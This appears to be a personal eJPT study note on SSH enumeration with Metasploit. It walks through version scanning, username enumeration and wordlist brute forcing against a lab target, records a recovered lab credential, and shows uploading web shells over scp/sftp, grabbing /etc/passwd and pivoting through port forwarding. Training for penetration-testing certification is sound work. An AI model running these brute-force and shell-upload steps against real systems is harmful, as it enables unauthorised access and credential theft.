---
title: SSH Enumeration
tags: [eJPT, Enumeration, SSH, Metasploit, BruteForce, OpenSSH]
created: 2026-04-06
source: Notion
---

# SSH Enumeration

**Related:** [[Introduction-to-Enumeration]] | [[Port-Scanning-Auxiliary-Modules]] | [[SMB-Enumeration]] | [[SMTP-Enumeration]] | [[00-INDEX]]

---

## Overview

SSH (Secure Shell) runs on **port 22 TCP** and is the standard for encrypted remote access. Metasploit provides auxiliary modules to enumerate SSH version, enumerate valid usernames, and brute force credentials.

---

## What is SSH?

- **Port:** 22 (TCP)
- Successor to Telnet — encrypts the entire communication channel
- Used for remote command-line access to servers
- Authenticates via:
  - **Password** — username + password
  - **Key-pair** — public/private key authentication (more secure)
- A successful SSH login gives you a full interactive shell on the target

---

## Metasploit SSH Auxiliary Modules

### 1. SSH Version Scanner

```bash
use auxiliary/scanner/ssh/ssh_version
set RHOSTS <target-ip>
run
```

- Identifies the SSH service version and underlying OS
- Lab result: **OpenSSH 7.9p1 on Ubuntu 19.04**
- Version info → search for CVEs: `search OpenSSH`

### 2. SSH Brute Force (Login Scanner)

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target-ip>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
run
```

- Attempts credential combinations from both wordlists
- On success: **automatically opens a Meterpreter/shell session**
- Lab result: **sysadmin : haley**

### 3. SSH Username Enumeration

```bash
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS <target-ip>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
```

- Exploits a timing side-channel in OpenSSH to confirm valid usernames
- Lab result: **root / demo / auditor / anon / administrator / diag / sysadmin**
- Narrows brute force — attack only confirmed valid usernames

---

## Interacting with SSH

### Connect Directly (Password Auth)

```bash
ssh <user>@<target-ip>
ssh sysadmin@192.168.1.10

# Non-default port
ssh sysadmin@192.168.1.10 -p 2222
```

### Connect with SSH Key (Key-Based Auth)

```bash
ssh -i id_rsa <user>@<target-ip>

# Fix permissions if key throws an error
chmod 600 id_rsa
ssh -i id_rsa root@192.168.1.10
```

### File Transfer over SSH

```bash
# Download a file from the target (SCP)
scp sysadmin@<target-ip>:/etc/passwd ./passwd

# Upload a file to the target
scp shell.php sysadmin@<target-ip>:/var/www/html/

# Recursive directory copy
scp -r sysadmin@<target-ip>:/home/sysadmin/data ./
```

### Interactive SFTP Session

```bash
sftp sysadmin@<target-ip>
sftp> ls
sftp> get secret.txt
sftp> put webshell.php /var/www/html/
sftp> bye
```

### SSH Local Port Forwarding (Pivoting)

```bash
# Forward remote MySQL (port 3306) to local port 3306
ssh -L 3306:127.0.0.1:3306 sysadmin@<target-ip>

# Then connect to the forwarded service locally
mysql -h 127.0.0.1 -u root -p
```

### Working with Metasploit SSH Sessions

When `ssh_login` succeeds, a session is created automatically:

```bash
sessions              # List all active sessions
sessions -i 1         # Interact with session 1
bash -i               # Upgrade to interactive shell
```

---

## Full Lab Workflow

```bash
service postgresql start
msfconsole
workspace add SSH_ENUM

# 1. Version scan
use auxiliary/scanner/ssh/ssh_version
set RHOSTS <target-ip>
run
# Result: OpenSSH 7.9p1, Ubuntu 19.04

# 2. Username enumeration
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS <target-ip>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
# Result: root/demo/auditor/anon/administrator/diag/sysadmin

# 3. Brute force with discovered usernames
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target-ip>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
run
# Result: sysadmin:haley — session opened automatically

# 4. Interact with the session
sessions
sessions -i 1
bash -i
# Now have interactive shell as sysadmin
```

---

## Searching for Modules

```bash
search type:auxiliary name:ssh
search OpenSSH    # Find exploits for the identified version
```

---

## Key Takeaways

- **ssh_enumusers first** — enumerate valid usernames before brute forcing to reduce noise and time
- **ssh_login auto-opens a session** — check `sessions` immediately after a successful run
- **`bash -i`** upgrades the basic session to a fully interactive shell
- OpenSSH version + OS info from ssh_version drives CVE research
- Next topic: **SMTP Enumeration** → [[SMTP-Enumeration]]
